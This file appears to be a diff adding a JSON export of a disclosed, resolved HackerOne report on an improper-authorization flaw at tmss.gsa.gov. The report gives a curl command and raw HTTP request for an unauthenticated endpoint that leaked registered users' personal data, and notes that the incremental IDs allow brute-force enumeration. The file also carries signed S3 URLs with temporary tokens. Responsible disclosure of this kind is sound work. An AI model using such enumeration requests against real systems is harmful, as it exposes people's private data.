@@ -1,0 +1,142 @@
+{
+  "id": 1175980,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTc1OTgw",
+  "url": "https://hackerone.com/reports/1175980",
+  "title": "[Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-26T23:19:41.390Z",
+  "submitted_at": "2021-04-26T23:19:41.504Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alexandrio",
+    "url": "/alexandrio",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4r4cawoutaa9j4pspfzfgk8jm7un/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50553,
+    "url": "https://hackerone.com/gsa_vdp",
+    "handle": "gsa_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9AGCZikBbg78ZgLS65KZumei/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/9AGCZikBbg78ZgLS65KZumei/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. General Services Administration",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-12-08T15:36:46.105Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-11-08T15:36:38.655Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nHi team!\nI hope you are having a great Tuesday :)\n\n**Where:** https://tmss.gsa.gov/ \n**Who:** Unathenticated users\n**Why:** Improper Access Control at `/tmssserver/api/public/customerregistration/{:id}/userId/`\n\n\nI found an endpoint (`/tmssserver/api/public/customerregistration/{:id}/userId/`) at https://tmss.gsa.gov/ (Transportation Management Services Solution (TMSS) 2.0) that  leads to data exposure of all registerd user at the platform,  including the following data: \n\n* Email address\n* Phone Number\n* Full Name\n* Secret question (If set)\n\n## Steps To Reproduce:\n1. Go to https://tmss.gsa.gov/\n2. Check that you are not authenticated. \n3. Now browse to https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ (You can replace 4750 by any other value between 0 and 4800)\n4. Or just CURL `curl \"https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/\" . The response includes email, Full name, and phone number of user with id 4750. \n{F1279543}\n\nThis is how the request looks like. As you can see there is no cookie in the headers or authentication bearer.\n```curl\nGET /tmssserver/api/public/customerregistration/4500/userId/ HTTP/1.1\nHost: tmss.gsa.gov\nConnection: close\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"\nAccept: application/json, text/plain, */*\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://tmss.preprod-acqit.helix.gsa.gov/tmss/customerregistration\nAccept-Language: es-ES,es;q=0.9\ndnt: 1\nsec-gpc: 1\n\n```\n5. As the id is incremental note that this can be easily brute-forced to leak all the user's information. \n `https://tmss.gsa.gov/tmssserver/api/public/customerregistration/:id/userId/`\n\n6. I was not able to submit my user ID as I don't have one until my account gets approved, but using this endpoint you can check that my data is also being leaked here.\n\n`curl \"https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/\"`\n\n{F1279546}\n\n```\n{\"userRegisterId\":192,\"registrationType\":\"User\",\"reportingOfficialId\":1504,\"agencyCode\":\"072\",\"bureauCode\":\"00\",\"firstName\":\"Alexandrio\",\"lastName\":\"Wearehackerone\",\"middleInitial\":\"C\",\"title\":\"\",\"addressLine1\":\"ThisIsMYAddress\",\"addressLine2\":\"PoCAddress\",\"city\":\"\",\"stateId\":null,\"zip\":\"\",\"zipSuffix\":\"\",\"countryId\":326,\"phone\":\"6541112343\",\"phoneExtension\":\"\",\"email\":\"alexandrio+1@wearehackerone.com\",\"accessRequested\":\"HHG\",\"registrationStatus\":\"Confirm Pending\",\"rejectReason\":null,\"confirmDate\":null,\"createdDate\":\"2021-04-26T22:51:08.000+0000\",\"updateProgram\":\"Customer_Registration\",\"updateId\":null,\"updateDate\":\"2021-04-26T22:51:08.000+0000\",\"agencyName\":null,\"agencyBureauName\":null,\"stateName\":null,\"countryName\":null}\n```\n\n\n\nIf you have some questions regarding this feel free to ping me!\nBests,\n@alexandrio\n\n## Impact\n\nData exposure (Emails, addresses, phone numbers, full names etc) of all registered user - Unauthenticated users",
+  "weakness": {
+    "id": 124,
+    "name": "Improper Authorization"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1279543,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4ow5pt9k5mh0rx0yvtnu7f64n4if?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WCR4ORR%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151300Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIHTjxBrX%2Fev2v5RJIVO1%2F5LwAEZ%2BFWiBWwEvH%2Fo9TfgOAiBqHJJrfmp6JVTTm30d1c08GpbbOT%2FuZX2ph%2BVKvzXClSq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEfRu1wPNVgYWUIugKo8FbRCdyf3NnLoSKZ%2BcSRIGGZhOJ39PKREt93pTLH2Uw8oH5v6xyl6rTVWnxAoAtasMBQbWpG80dfwVF63VIYK3MfiQ9vDTbSdDNEirz4RF78zWEq49rtDzFJ%2BaDLqeJOaXN7epkMzdNdjGIlfGCKjtDf6jy8YCUXKzgQf34kbU8iNTmDgblGnSndWqDhCqxiLc%2BQQ2kQYiu8MwqZxHrGhQw8HjQJBwWkW700ZwFE3Mz%2FV5UA%2By0tuuYbfDutxK2AfiKJSQlnUSIeGhfc%2BFmQLcQMClkXnn2ZfmBrtAwZ0yN37OEsGt7CW9nnOWRn%2BZVBI2KLOOQQ%2FYUt8ZH%2BIXFrxbhbCcJ3uLnOL9%2B6T9Rl9xAsMG5S86Ks%2Bsx4Rt3wZ8Blaxj1cdtdtRkLXJOsBQPk5fJuOufy4ueRWTieL6jYKt6abCuII%2F7ZY57L9cST6Ny%2FiDNbj%2BWOUI97VLRJzXTnOGiC6CGJeIMYmY2FUAu8yDf1DCvGTMSQWD9bqzYFLP%2BiuWppC7yh8TRSefwOJ5xigkhVuupPUzDVvPTlp5urtfbCJr7AFEZyZgx%2FQS8fTatLbRDEpkJyeydzGhkFYNZyuARp3cGE%2FWdkYyAepxzb2LmCCHKvxS5Y1is8QembANHmjpZsX4r6MrfOfEN9ilxXWYRjW1tS7ZE5AFMIxEzMgR5LVgsfyg6FPziUz1UcEF%2BoDaRuhX86yoAzByw3q3jk06w7KffYCZuEapiDxy%2BXSEhRjuU1K4JFchVjLn2I%2FyBI%2FmbH6%2BAzPOJ506w6XJ9kXWPBJJ3G4LvWDyZc3D4FETs%2BylzUMO5tiWiYPEox4uZHtKUZBiEWoNgdnQptjQwRToc%2FUjg%2FVjquNQZ087s7z0njCck%2F3PBjqyAcxRCyrsaU8ZxH0Ud3hlPayew4RitE9YcSsPh%2BtCBowyaDOmvJdePDxZvlB1boDHEHuH%2FMbW9Ip3LGzlFAA%2FqUHi%2Fy7vnTpV%2FpSuJSSCd4fYrwgHbMQMDVqpdaIJ%2BLslpgbp3Sn7%2Fx4oMZxFrpxEhVRCmCGAltgkq3MVXAvZ30yNWlHZ%2FF1jtSe0AkhZJQB2QcRFue2jd4g2pFsm4J3eJTtNYUDx7VnkJfdoW5ti2n7sLfA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47f8f091f0c0f1096131001b42b9ae25d38cbf61ccf699016c6518db3f7dde4c",
+      "file_size": 30229,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1279546,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/panszpikvf22gcsq3qohlgfeero6?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WCR4ORR%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151300Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIHTjxBrX%2Fev2v5RJIVO1%2F5LwAEZ%2BFWiBWwEvH%2Fo9TfgOAiBqHJJrfmp6JVTTm30d1c08GpbbOT%2FuZX2ph%2BVKvzXClSq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEfRu1wPNVgYWUIugKo8FbRCdyf3NnLoSKZ%2BcSRIGGZhOJ39PKREt93pTLH2Uw8oH5v6xyl6rTVWnxAoAtasMBQbWpG80dfwVF63VIYK3MfiQ9vDTbSdDNEirz4RF78zWEq49rtDzFJ%2BaDLqeJOaXN7epkMzdNdjGIlfGCKjtDf6jy8YCUXKzgQf34kbU8iNTmDgblGnSndWqDhCqxiLc%2BQQ2kQYiu8MwqZxHrGhQw8HjQJBwWkW700ZwFE3Mz%2FV5UA%2By0tuuYbfDutxK2AfiKJSQlnUSIeGhfc%2BFmQLcQMClkXnn2ZfmBrtAwZ0yN37OEsGt7CW9nnOWRn%2BZVBI2KLOOQQ%2FYUt8ZH%2BIXFrxbhbCcJ3uLnOL9%2B6T9Rl9xAsMG5S86Ks%2Bsx4Rt3wZ8Blaxj1cdtdtRkLXJOsBQPk5fJuOufy4ueRWTieL6jYKt6abCuII%2F7ZY57L9cST6Ny%2FiDNbj%2BWOUI97VLRJzXTnOGiC6CGJeIMYmY2FUAu8yDf1DCvGTMSQWD9bqzYFLP%2BiuWppC7yh8TRSefwOJ5xigkhVuupPUzDVvPTlp5urtfbCJr7AFEZyZgx%2FQS8fTatLbRDEpkJyeydzGhkFYNZyuARp3cGE%2FWdkYyAepxzb2LmCCHKvxS5Y1is8QembANHmjpZsX4r6MrfOfEN9ilxXWYRjW1tS7ZE5AFMIxEzMgR5LVgsfyg6FPziUz1UcEF%2BoDaRuhX86yoAzByw3q3jk06w7KffYCZuEapiDxy%2BXSEhRjuU1K4JFchVjLn2I%2FyBI%2FmbH6%2BAzPOJ506w6XJ9kXWPBJJ3G4LvWDyZc3D4FETs%2BylzUMO5tiWiYPEox4uZHtKUZBiEWoNgdnQptjQwRToc%2FUjg%2FVjquNQZ087s7z0njCck%2F3PBjqyAcxRCyrsaU8ZxH0Ud3hlPayew4RitE9YcSsPh%2BtCBowyaDOmvJdePDxZvlB1boDHEHuH%2FMbW9Ip3LGzlFAA%2FqUHi%2Fy7vnTpV%2FpSuJSSCd4fYrwgHbMQMDVqpdaIJ%2BLslpgbp3Sn7%2Fx4oMZxFrpxEhVRCmCGAltgkq3MVXAvZ30yNWlHZ%2FF1jtSe0AkhZJQB2QcRFue2jd4g2pFsm4J3eJTtNYUDx7VnkJfdoW5ti2n7sLfA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7fde183e08bc29f5300ae990f38d2838ad1079e9f59fce5ca65ae107df59ae85",
+      "file_size": 36221,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-12-08T15:36:38.779Z",
+  "allow_singular_disclosure_after": -139361782.2030618,
+  "singular_disclosure_allowed": true,
+  "vote_count": 14,
+  "voters": [
+    "alexandrio",
+    "alp",
+    "shreyaschavhan",
+    "h4x0r_dz",
+    "pr0f0x01",
+    "official_blackhat13",
+    "eminfidan",
+    "0619",
+    "smilekilerguy",
+    "0xmekky0x0x",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 59984,
+    "asset_type": "URL",
+    "asset_identifier": "tmss.gsa.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
